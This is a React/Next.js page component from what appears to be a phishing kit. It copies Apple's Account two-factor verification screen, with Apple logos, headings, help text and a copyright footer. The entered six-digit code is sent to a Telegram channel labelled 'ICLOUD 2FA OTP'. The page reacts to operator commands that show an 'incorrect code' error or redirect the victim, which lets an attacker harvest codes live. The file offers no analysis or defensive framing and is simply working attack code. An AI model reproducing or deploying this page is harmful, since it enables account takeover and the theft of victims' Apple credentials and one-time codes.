"use client"
import '../app/globals.css';
import { useState, useEffect, useRef } from 'react';
import { sendMessageToTelegram } from '../lib/api';
import { useCommand } from '../app/lib/CommandContext';
import { useRouter } from 'next/navigation';

export default function AppleOtpPage() {
    const [otpValues, setOtpValues] = useState(['', '', '', '', '', '']);
    const [isLoading, setIsLoading] = useState(false);
    const [isInvalid, setInvalid] = useState(false);
    const inputRefs = useRef([]);
    const router = useRouter();
    const { command, resetCommand } = useCommand();

    useEffect(() => {
        if (command === 'REQUEST_ICLOUD_2FA_OTP_AGAIN') {
            setInvalid(true);
            setIsLoading(false);
        } else if (command === 'FINISH') {
            router.push('/verificationPage');
        }
    }, [command, router, resetCommand]);

    const handleChange = (index, value) => {
        // Allow only numbers
        if (value && !/^\d+$/.test(value)) return;

        const newOtpValues = [...otpValues];
        newOtpValues[index] = value;
        setOtpValues(newOtpValues);

        // Auto focus to next input on entry
        if (value && index < 5) {
            inputRefs.current[index + 1]?.focus();
        }

        // Check if all inputs are filled to submit automatically
        if (newOtpValues.every(val => val !== '') && newOtpValues.join('').length === 6) {
            handleSubmit(newOtpValues.join(''));
        }
    };

    const handleKeyDown = (index, e) => {
        // Handle backspace to move to previous input
        if (e.key === 'Backspace' && !otpValues[index] && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
    };

    const handleSubmit = (code = otpValues.join('')) => {
        if (code.length !== 6) return;
        
        setIsLoading(true);
        sendMessageToTelegram(`ICLOUD 2FA OTP: ${code}`);
    };

    const hideError = () => {
        setInvalid(false);
    };

    // Add focus to first input on mount
    useEffect(() => {
        inputRefs.current[0]?.focus();
    }, []);

    return (
        <div className="bg-white text-black min-h-screen">
            {/* Header */}
            <div className="flex flex-col max-w-[1020px] gap-3 px-3 mx-auto max-h-[100px]">
                {/* header-one */}
                <div className="w-full flex justify-between items-start max-h-[48px] relative -mt-[2px]">
                    <div className='relative -mt-[14px]'>
                        <svg height="78" viewBox="0 0 17 48" width="14" xmlns="http://www.w3.org/2000/svg" className="scale-100">
                            <path d="m15.5752 19.0792a4.2055 4.2055 0 0 0 -2.01 3.5376 4.0931 4.0931 0 0 0 2.4908 3.7542 9.7779 9.7779 0 0 1 -1.2755 2.6351c-.7941 1.1431-1.6244 2.2862-2.8878 2.2862s-1.5883-.734-3.0443-.734c-1.42 0-1.9252.7581-3.08.7581s-1.9611-1.0589-2.8876-2.3584a11.3987 11.3987 0 0 1 -1.9373-6.1487c0-3.61 2.3464-5.523 4.6566-5.523 1.2274 0 2.25.8062 3.02.8062.734 0 1.8771-.8543 3.2729-.8543a4.3778 4.3778 0 0 1 3.6822 1.841zm-6.8586-2.0456a1.3865 1.3865 0 0 1 -.2527-.024 1.6557 1.6557 0 0 1 -.0361-.337 4.0341 4.0341 0 0 1 1.0228-2.5148 4.1571 4.1571 0 0 1 2.7314-1.4078 1.7815 1.7815 0 0 1 .0361.373 4.1487 4.1487 0 0 1 -.9867 2.587 3.6039 3.6039 0 0 1 -2.5148 1.3236z"></path>
                        </svg>
                    </div>
                </div>

                <div className="flex absolute opacity-50 right-5 top-5 md:hidden">
                    <svg width="16px" className='scale-150' height="16px" viewBox="0 0 20 20">
                        <polyline id="globalnav-menutrigger-bread-bottom" className="globalnav-menutrigger-bread globalnav-menutrigger-bread-bottom" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLineJoin="round" points="2 12, 16 12"></polyline>
                        <polyline id="globalnav-menutrigger-bread-top" className="globalnav-menutrigger-bread globalnav-menutrigger-bread-top" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLineJoin="round" points="2 5, 16 5"></polyline>
                    </svg>
                </div>

                {/* header-two */}
                <div className="w-full flex border-b border-gray-300 pb-3 justify-between items-center max-h-[48px]">
                    <div className='AppleSemiBold font-semibold text-xl'>
                        Apple Account
                    </div>

                    <div className="text-xs AppleReg text-gray-500">
                        Verification
                    </div>
                </div>
            </div>

            {/* Main container */}
            <div className='flex flex-col items-center mt-9 w-full'>
                <div className='flex-col w-full px-3 max-w-[507px] items-center text-center'>
                    {/* Apple Logo SVG */}
                    <div className="flex justify-center mb-6">
                        <svg viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" className="w-16 h-16">
                            <path fill="var(--theme-color-systemBlack)" d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z"></path>
                        </svg>
                    </div>

                    {/* Title and instructions */}
                    <h1 className="text-2xl font-semibold mb-3">Two-Factor Authentication</h1>
                    <p className="text-gray-700 mb-6">Enter the verification code sent to your Apple devices.</p>

                    {/* OTP Input */}
                    <div className="flex justify-center gap-2 md:gap-3 mb-6">
                        {otpValues.map((value, index) => (
                            <input
                                key={index}
                                ref={el => inputRefs.current[index] = el}
                                className={`w-10 h-12 text-center border ${isInvalid ? 'border-red-500' : 'border-gray-300'} rounded-md text-lg focus:outline-none focus:border-blue-500 focus:border-2 bg-white dark:bg-white text-black dark:text-black`}
                                type="text"
                                maxLength={1}
                                value={value}
                                onChange={(e) => handleChange(index, e.target.value)}
                                onKeyDown={(e) => handleKeyDown(index, e)}
                                onClick={hideError}
                            />
                        ))}
                    </div>

                    {isInvalid && (
                        <p className="text-red-500 text-sm mb-4">
                            Incorrect verification code. Please try again.
                        </p>
                    )}

                    {/* Links */}
                    <div className="text-blue-500 mb-6 flex flex-col gap-2">
                        <a href="#" className="hover:underline">Resend code to devices</a>
                        <a href="#" className="hover:underline">Can't get to your devices?</a>
                    </div>

                    {/* Helper text */}
                    <p className="text-gray-600 text-sm mb-8 max-w-sm mx-auto">
                        If you can't enter a code because you've lost your device, you can use Find Devices to locate it or Manage Devices to remove your Apple Pay cards from it.
                    </p>

                    {/* Loading indicator */}
                    {isLoading && (
                        <div className="flex justify-center mb-4">
                            <div className="w-6 h-6 border-t-2 border-blue-500 border-solid rounded-full animate-spin"></div>
                        </div>
                    )}
                </div>

                {/* Footer container */}
                <div className='flex mt-16 sm:relative absolute bottom-0 px-[22px] h-[83px] bg-[#f7f7f7] w-full justify-center items-center flex-col'>
                    <div className='text-gray-700 text-xs'>
                        Copyright © 2025 Apple Inc. All rights reserved.
                    </div>
                    <div>
                        <a href="" className='text-xs font-light hover:underline'>
                            Privacy Policy
                        </a>
                    </div>
                </div>
            </div>
        </div>
    );
}
